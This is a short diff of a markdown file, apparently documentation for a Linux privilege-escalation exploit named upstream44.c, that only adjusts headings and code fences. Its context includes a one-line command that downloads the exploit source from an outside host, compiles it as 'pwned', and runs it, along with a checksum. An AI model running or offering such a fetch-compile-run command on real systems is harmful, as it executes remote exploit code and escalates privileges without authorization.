@@ -44,8 +44,11 @@ reboot
 
 wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 
 
+```
 
-upstream44.c
+### upstream44.c
+
+```
 
 sha256sum b71b2317c2f2461f0c25a650c9c6a4dd2399e5d7f800ec19822ba720a574030d
 
